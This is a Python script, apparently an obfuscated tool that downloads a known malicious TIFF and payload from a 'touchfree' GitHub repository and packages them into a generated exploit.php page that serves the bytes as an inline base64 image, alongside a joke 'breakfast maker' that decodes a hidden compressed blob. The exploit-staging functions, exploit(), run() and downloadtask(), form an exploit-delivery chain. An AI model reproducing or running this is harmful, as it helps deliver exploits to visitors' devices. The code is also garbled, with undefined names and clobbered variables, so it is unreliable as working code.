import base64 as i
import binascii as l
import logging as f
import os as j
import pathlib as q
import pyminizip as cc
import pickle as m
import random as n
import requests as g
import sentry_sdk as e
import struct as a
import sys as s
import time as r
import urllib3 as cd
import zlib as p
from sentry_sdk.integrations.logging import LoggingIntegration
g.packages.urllib3.disable_warnings()  # This is so we don't get some warning about SSL.
production=False
p_errors=False
bc=print
def setup_log(sentry_w, bc_errors):
    global logger, production
    sentry_logging=LoggingIntegration(
        level=f.INFO,
        event_level=f.INFO
    )
    e.init(dsn=sentry_w, integrations=[sentry_logging])
    logger=logging.getLogger(__name__)
    p_errors=bc_errors
    production=True
def log(msg, level):  
    # TODO: Use bgber levels, strings are annoying
    if p_errors:
        bc(msg)
    if production:
        if level=="VERBOSE":
            logger.debug(msg)
        elif level=="INFO":
            logger.info(msg)
        elif level=="WARNING":
            logger.warning(msg)
        elif level=="CRITICAL":
            logger.critical(msg)
def u8(b):
    if not 0 <= b <= 255:
        log("u8 out of range: %s" % b, "INFO")
        b=0
    return a.pack(">B", b)
def u16(b):
    if not 0 <= b <= 65535:
        log("u16 out of range: %s" % b, "INFO")
        b=0
    return a.pack(">H", b)
def u32(b):
    if not 0 <= b <= 4294967295:
        log("u32 out of range: %s" % b, "INFO")
        b=0
    return a.pack(">I", b)
def pad(c):
    d=""
    for _ in range(c): d += "\0"
    return d
class Waffleb:
	def __init__(self):
		self.cooking_time=100
		self.b="eNp9VbGu3DgM7PMVhBs2sq4VDnHKwxUu1DLehQhBxeukD7iPvyEl78tLXuJisbbJ4Qw5lIn+dJUfri+/i+n92Lbr70siblreWFLejtE/zQhHZpW4C+OGW0pKoWuOUvVb6VlG/DUtJAsO8tC3SGFkpvKUy19xyO0ynlHl54LhYEIpteTnyOmiIcwa9BHLGIzHWvFSN0D+lFwaFzyM2ks4NjaKdb04NujEPWe8NTV4SPohvSWvSe3IUsn4kkQ5V3DRt+JtQyNq7GiEUpT+nt84SnSZqBOtq+SqpZsAoq1K97fPEbWWCcUSXwjJyBvNoR7+rN3lht1nRNDEF2r7DIRTR3+RsT/PBRFsini0VHsPEL9bUSXAOTeBqO59RrDWv1yz1IkRKHXtVhVqJt0ydoz5VV9i9oxHTIYXEGz9tri8QKSZV8gfmcLggEqcJoO2nXcGXyR9ekL4uymiuyM50QNsDnYOdU0SrMHhnBy2iQgcmEPOd1GReXG5xB/JuQ9vG8LmiNpe50SDVZA+Z6/fIOsfG5K4jeRGuWwO8SbRsC3nPkkILVkHyySxLHzu8335niZKdeOidXST6IvDXI+bBHo/IdH6OjtpJNN/q720zAVjypwuZTcqhMK3j5ni7QWLr+zCzU4Mh9E9JarAcYc1GLKvPQHkGZ2crdlj/rUdfsyazZcTOXQtGI0ko3icBvh+/i19sUBOzbYxE/PUat1BEEV9a9xu+yN6Ns/W/sgJ22pGz07NpZUR7wjQ0OprQsoNp8lricDGqfpUL7o5KHc7SYrJNa9Emizkkr62l95ByOas/16rh+8zIHqpIiCCzuDbVrFl+oHIlGTxy97LJjgL8vJRGPOIKjciEEDkw3E4+649OhcIOpdRw8TzJt0qnOFHDi8IMMFpqTDUrFeC7ebJd+2Y5tQB+OsHQPrkyPaB6OksLkWEzb6lhIH5ONLIn309dBt31whH+WbXvtsv803g07orZaNeyudfMRx2v81bk9d9H/vr6mNX5i//A5YHk94="
class Waffle:
	def __init__(self, waffle):
		self.waffle=waffle
	def display(self, file=s.stdout):
		file.write(self.waffle)
class WaffleIron:
	def __init__(self):
		self.power=False
		self.time=0
		self.full=False
		self.contents=False
		pass
	def switchPower(self, power):
		self.power=power
	def fill(self, contents):
		if not self.power:
			raise RuntimeError("Turn on the iron first!")
		if not isinstance(contents, Waffleb):
			raise ValueError("Iron can only be filled with waffle!")
		self.contents=contents
		self.time=r.time()
		return self.contents.cooking_time
	def contentsAreCooked(self):
		return r.time() > (self.time+self.contents.cooking_time)
	def getTimeLeft(self):
		return max(0,(self.time+self.contents.cooking_time) - r.time())
	def getContents(self):
		if self.contentsAreCooked():
			b=self.contents.b
			cookedb=p.decompress(i.b64decode(b))
			self.contents=Waffle(cookedb)
		else:
			raise RuntimeError("Waffle is not yet cooked!")
		return self.contents
class BreakfastType:
	def __init__(self):
		raise NotImplementedError("BreakfastType is abstract")
class Waffles(BreakfastType):
	def __init__(self):
		pass
	def make(self):
		b=Waffleb()
		iron=WaffleIron()
		iron.switchPower(True)
		cooktime=iron.fill(b)
		cm, cs=divmod(cooktime,60)
		if cm > 0:
			bc("Cooking time will be approximately %d minute%s and %d second%s"%(cm, 's'*(cm!=1), cs, 's'*(cs!=1)))
		else:
			bc("Cooking time will be approximately %d second%s"%(cs, 's'*(cs!=1)))
		while not iron.contentsAreCooked():
			left=iron.getTimeLeft()
			m,s=divmod(left+0.99,60)
			s.stdout.write("%02d:%02d"%(m,s))
			s.stdout.flush()
			r.sleep(0.5)
			s.stdout.write("\x08"*5)
			s.stdout.flush()
		bc
		waffle=iron.getContents()
		iron.switchPower(False)
		return waffle
class BreakfastMaker:
	preferredBreakfasts={'bushing':Waffles}
	def __init__(self):
		pass
	def makeBreakfastFor(self, user):
		if not user in self.preferredBreakfasts:
			raise ValueError("I don't know how to make breakfast for %s!"%user)
		maker=self.preferredBreakfasts[user]
		breakfast=maker().make()
		return breakfast
def startbreakfast():
  bc("Breakfast Maker v0.2")
  user=input("Please enter your username: ")
  maker=BreakfastMaker()
  bc("Making breakfast for %s..."%user)
  breakfast=maker.makeBreakfastFor(user)
  bc("Your breakfast is ready!")
  breakfast.display()
  bc("\a")
def exploit(a, b):
  if a == 0:
    if b == 1: #No Pre-Existing Mode
      pre(0)
      task(2)
    elif b == 2: #With Pre-Existing Mode
      pre(1)
      task(2)
    elif b == 3: #Download Hex Template Mode
      pre(1)
      os._exit(0)
    elif b == 4: #Re-generate Credits File mode
      credits(0)
  elif a == 1:
    # Open in binary mode (so you don't read two byte line endings on Windows as one byte)
    # and use with statement (always do this to avoid leaked file descriptors, unflushed files)
    with open('exploit.tiff', 'rb') as f:
        # Slurp the whole file and efficiently convert it to hex all at once
        hexdata = l.hexlify(f.read())
        m.dump((hexdata.decode('utf-8')), open('hex.dat', 'wb'))
  elif a == 2:
    data2 = str(q.Path(__file__).parent.absolute()) + "/" + "exploit.tiff"
    url2 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
    downloadtask(data2, url2)
  elif a == 3:
    data1 = str(q.Path(__file__).parent.absolute()) + "/" + "payload.bin"
    url1 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
    downloadtask(data1, url1)
  elif a == 4:
    credits(1)
  elif a == 5:
    if j.path.exists("payload.bin"):
      j.remove("payload.bin")
  elif a == 6:
    if j.path.exists("hex.dat"):
      j.remove("hex.dat")
  elif a == 7:
    if j.path.exists("exploit.tiff"):
      j.remove("exploit.tiff")
  elif a == 8:
    if j.path.exists("exploit.bin"):
      j.remove("exploit.bin")
  elif a == 9:
    if j.path.exists("exploit.php"):
      j.remove("exploit.php")
  else:
    exploit(0)
def run():
  load_file = open('hex.dat', 'rb')
  f = m.load(load_file)
  with open('exploit.bin', 'wb') as fout:
    fout.write(
      l.unhexlify(f)
    )
  exploit(6, 0)
  data = open('exploit.bin', 'rb').read()
  a = i.b64encode(data)
  b = a.decode()
  html = '<?php\n$htmlcode = "<img src=\\"data:image/png;base64,' + b + '\\">";\necho $htmlcode\n?>'
  open('exploit.php', 'w').write(html)
  exploit(7, 0)
  exploit(8, 0)
  return html
def pre(a):
  if a == 0:
    task(1)
    task(0)
    data = int(0)
    return data
  elif a == 1:
    task(1)
    data = int(0)
    return data
  elif a == 2:
    exploit(5, 0)
    task(0)
    data = "MSG:" + " " + str(pathlib.Path(__file__).parent.absolute()) + " " + "DOWNLOADED!"
    return data
def credits(a):
    a = "credits:\n"
    b = a + "base64 implmentation by fmw42\n"
    c = b + "hex implementation by falsetru\n"
    d = c + "file to hex implementation by ShadowRanger\n"
    e = d + "urllib3 downloading implementation by shazrow\n"
    f = e + "exploit.bin based on exploit.tiff by planetbeing\n"
    if a == 0:
      h = open("CREDITS.txt", "a")
      h.write(f)
      h.close()
    elif a == 1:
      print(f)
def task(a):
  if a == 0:
    exploit(2, 0)
    exploit(1, 0)
  elif a == 1:
    exploit(5, 0)
    exploit(4, 0)
    exploit(3, 0)
  elif a == 2:
    run()
    j._exit(0)
def downloadtask(a, b):
  c = cd.PoolManager()
  r = c.request('GET', b, preload_content=False)
  chunk_size = n.randint(10, 1000)
  with open(a, 'wb') as out:
    while True:
      a = r.read(chunk_size)
      if not a:
        break
      out.write(data)
  r.release_conn()
def getcurrentpath():
	a=str(q.Path(__file__).parent.absolute())
	return a
def compressmultiple(a, b, c, d):
	cc.compress_multiple([a, b], d, c, 4, progress)
	msg=returnmsg()
	return msg
def returnmsg():
	msg="done"
	return msg
def zero():
	a=0
	return a
def one():
	a=1
	return a
